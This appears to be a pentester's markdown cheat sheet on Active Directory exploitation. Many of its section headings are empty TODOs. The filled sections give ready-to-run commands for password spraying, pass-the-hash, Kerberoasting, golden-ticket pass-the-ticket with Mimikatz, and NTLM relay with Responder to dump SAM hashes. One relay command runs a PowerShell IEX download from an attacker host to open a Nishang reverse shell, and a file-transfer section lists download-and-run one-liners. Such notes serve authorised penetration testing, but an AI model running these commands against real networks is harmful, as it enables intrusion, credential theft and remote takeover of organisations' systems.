# AD Exploitation

## Initial Access and Windows API

### Enumerating the Organization for Initial Access Overview

TODO

### Common Public-Facing Services Insecurities

TODO

### OSINT Primer for AD Pentesting

TODO

### Password Spraying

In case of having a list of users and passwords, we can use the following command to validate them:

```bash
cme {smb, winrm, ssh, ldap, mssql} -u users.txt -p passwords.txt
```

If we don't want the process to stop once valid credentials are found, we can use the  `--continue-on-success` flag.

### Pass the Hash

If we have valid `NTLM` hashes, we will use one of the following commands to connect to the target machine:

```bash
psexec.py domain.local/user@10.10.10.1 -hashes {NTLM HASH}
```

```bash
smbexec.py domain.local/user@10.10.10.1 -hashes {NTLM HASH}
```

```bash
wmiexec.py domain.local/user@10.10.10.1 -hashes {NTLM HASH}
```

### RDP Access with Pass The Hash

TODO

### Accessing LAPS

TODO

### Misconfigured Sysvol Policies

TODO

### Brute Forcing Hashes

TODO

### Windows API Overview

TODO

### Process, Threads, DLLs, Virtual Memory

TODO

### Creating Malicious Payloads with Windows API

TODO

### Understanding the Detection Engineering and Endpoint Detections

TODO

### Static and Dynamic Analysis to Bypass AV Engines

TODO

#### Salsa tools

TODO

https://github.com/Hackplayers/Salsa-tools

#### Ebowla

TODO

https://github.com/Genetic-Malware/Ebowla-

### Offensive VBA for Pentesters

TODO

### Developing Malicious Documents for Initial Access

TODO

### Stomping the Malicious Documents

TODO

### Crafting Malware with JScript

TODO

## Kerberos and ACL

### Understanding Delegations

TODO

### Attacking Unconstraint Delegations

TODO

### Attacking Constraint Delegations

TODO

### Attacking Service Principal Names

TODO

### Attacking Service Accounts

TODO

### Targeted Kerberosting Attacks

#### ¿How to know if target is vulnerable?

To make a machine vulnerable to  `Kerberoasting`, we will use the following command:

```powershell
setspn -a domain.local/user.DC1 domain.local/user
```

#### List Vulnerable Machines

Having valid credentials for the AD. We can list the vulnerable machines on the domain, with a tool of the `impacket` suite, using the following command:

```bash
GetUserSPNs.py domain.local/user:password
```

#### TGS

Once we have checked that the credentials are valid, we can use the `GetUserSPNs.py` tool with the `request` flag to request a `TGS` (Ticket Granting Service) to the `DC`:

```bash
GetUserSPNs.py domain.local/user:password -request
```

This will ask to the `DC` a `TGS`and will display it as a hash. At this point, we will crack the hash offline to obtain the password. In case of obtaining the password we will have all the machine of the domain `(Pwn3d!)` in `CME`.

##### Rubeus

We can reproduce the same process above, but instead of using the `impacket` suite and attacking from the attackers machine, uploading the `Rubeus.exe` binary to the target machine. We can retrieve the `TGS` hash with the following command:

```powershell
Rubeus.exe kerberoast /creduser:domain.local\user /credpassword:password
```

### Kerberos Double Hope Issues

TODO

### Distributed COM Model Issues

TODO

### Pass the Ticket and Overpass the Hash Attacks

TODO

#### Pass the Ticket

##### Remote Shell

TODO

##### Privileged Resources

In most cases, we can't access the privileged resources in the `DC`. If we for example try, with the  `dir\\DC\c$` command, to list the content of the `C:` volume in the `DC`, we can see that we can't. As we have seen, we can have a `Golden Ticket` from the DC. Having this ticket, we can use the following command in the target machine, using `Mimikatz`, to do  the  `PassTheTicket`  attack and thus, have privileged resources enabled:

```powershell
kerberos::ptt golden.kirbi
```

Once we have injected the ticket in the `DC`, we can use the following command to mount the `DC` privileged shares:

```powershell
net use x: \\dc1.domain.local\c$
```

### Domain Certificate Service Attacks

TODO

### NTLM Relay Attacks

#### ¿How to know if target is vulnerable?

`SMB` doesn't have to be signed.

#### Dump SAM

Change the configuration of Responder in `/usr/share/responder/Responder.conf`. We have to  switch `Off` `SMB` and `HTTP`.

Create a file named `targets.txt`, include the IPs that we want to compromise.

Use the following commands with the `ntlmrelayx.py` y `responder.py` programs:

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

```bash
python3 Responder.py -I eth0 -rdw
```

In case that a user has `Administrator` privileges in a machine of the AD and accesses a shared resource that is not available, we can dump the `SAM` of that machine.

As it fails to validate the legitimacy of the origin, the `ntlmrelayx.py` program intercepts the connection that is looking for an invalid network resource. In case there is a user who is an `Administrator` of the `target` machine, `ntlmrelayx.py` will redirect the flow of that authentication to the victim machine, which will allow us to dump the `SAM` of the victim machine.

#### Command Execution

You can also execute commands in the target machine, using the same method but changing some arguments in `ntlmrelayx.py`. We will use the following command to perform the attack:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
```

```bash
python3 Responder.py -I eth0 -rdw
```

#### Reverse Shell

In this case, if we want to access to the machine, we can send the reverse shell from `nishang/Shells/Invoke-PowershellTCP.ps1`. First, we have to modify the reverse shell adding the following line to the end of the file: `Invoke-PowershellTCP -Reverse -IPAddress 10.10.10.10 -Port 443`. This will allow us to load the module and run it at the same time. The, we will be listening for a connection with `nc -nlvp 443` and will share the file with `python3 -m http.server`. Last, we will execute the following commands:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8000/Invoke-PowershellTCP.ps1')'
```

```bash
python3 Responder.py -I eth0 -rdw
```

We will receive a connection from the reverse shell in the port that we are listening.

#### IPv6

The last attack can be dome in IPv6 as well but with other tools. First we will use the `mitm6` to poison the network traffic:

```bash
mitm6 -d domain.local
```

```bash
ntlmrelayx.py -6 -wh 10.10.10.10 -t smb://10.10.10.1 -socks -debug -smb2support
```

This will open an interactive session of the `ntlmrelayx.py` tool. We will use the `socks` command to list the available `relays`. If the user tries to access to a shared resource that is not available, a new `relay` will appear. If we have `AdminStatus` to `True`, it means that we have received the authentication of an `Administrator`user. In the `/etc/proxychains.conf` file we will add `socks4 127.0.0.1 1080` in the end.  

Then we will use `CrackMapExec` to connect to the machine (Password can be anything):

```bash
proxychains cme smb 10.10.10.1 -u 'user' -p 'randompass' -d domain
```

We can use the following command to dump the `SAM` of the target machine:

```bash
proxychains cme smb 10.10.10.1 -u 'user' -p 'randompass' -d domain --sam
```

### Attacking via Sensitive Groups to Become Domain Administrator

TODO

### Exploiting ACLs in AD

TODO

## PowerShell and In-Memory Executions

### Understanding the Basics of PowerShell cmdlets

TODO

### File Transfer

#### HTTP

First, we will need to create an `HTTP` server that contains the files that we want to download in the target machine, to do this we will use the `python3 -m http.server` command.

#### Powershell

To download the files hosted in the `HTTP` from `Powershell`,  we can use any of this commands:

```powershell
Certutil.exe -f -split -urlcache http://10.10.10.2:8000/file file

bitsadmin /transfer job http://10.10.10.2:8000/file file

curl http://10.10.10.2:8000/file -o file

IEX(New-Object Net.WebClient).downloadString('http://10.10.10.2:8000/file')

iwr -Uri http://10.10.10.2:8000/file -OutFile file

wget http://10.10.10.2:8000/file -OutFile file
```

#### SMB

In case of needing file upload and file download, we will create an `SMB` shared folder:

```bash
impacket-smbserver smbFolder $(share) -smb2support
```

Then, we can use the following command in the target machine to download the file:

```powershell
copy \\10.10.10.2\smbFolder\file
```

If we want to upload files to the shared `SMB` folder, we can mount it. To do this:

```powershell
net use x: \\10.10.10.2\smbFolder\
net use # Para listar los recursos compartidos en red
copy file X:\file
```

If we want to unmount the shared folder:

```powershell
net use x: /delete
```

### Understanding WMI and Powershell Remoting

#### WmiExec

Once we have valid credentials we can obtain a shell in the target machine using `wmi`:

```bash
wmiexec.py domain.local/user:password@10.10.10.1 cmd.exe
```

### PsExec

Once we have valid credentials we can obtain a `powershell` in the target machine:

```bash
psexec.py domain.local/user:password@10.10.10.1
```

### SmbExec

Once we have valid credentials and having the `SMB` service available, we can obtain a shell in the target machine:

```bash
smbexec.py domain.local/user:password@10.10.10.1 cmd.exe
```

#### Evil-WinRM

In the case we have the `WinRM` service available in the target machine and we have valid credentials, we can connect to it using the following command:

```bash
evil-winrm -u 'user' -p 'password' -i 10.10.10.1
```

### PowerShell Reverse Shell and Payloads

TODO

### Payload Execution on the Fly, Avoid Writing Into Disk

TODO

### Fileless Attacks Process and Lifecycle

TODO

### Reflective DLL Loader with PowerShell

TODO

### Obfuscation with PowerShell

TODO

### Disabling Defences and Adding Exclusions with PowerShell

TODO

### Bypassing Restricted Admin Mode

TODO

### Understanding the AMSI Service

TODO

### Bypassing AMSI Protections

TODO

### Understating In-Memory Executions

TODO

### Executing Executable Assemblies in Memory

TODO

## Application Whitelisting and AppLocker Policies

### Understanding the Application Whitelisting

TODO

### Bypassing the Powershell Execution Restrictions

TODO

### Restricting Executions with Applocker Policies

TODO

### Default Policies and Custom Policies

TODO

### Bypassing the AppLocker Policies with Common Whitelisted Locations

TODO

### Bypassing CLM with the Living Off the Lands Techniques

TODO
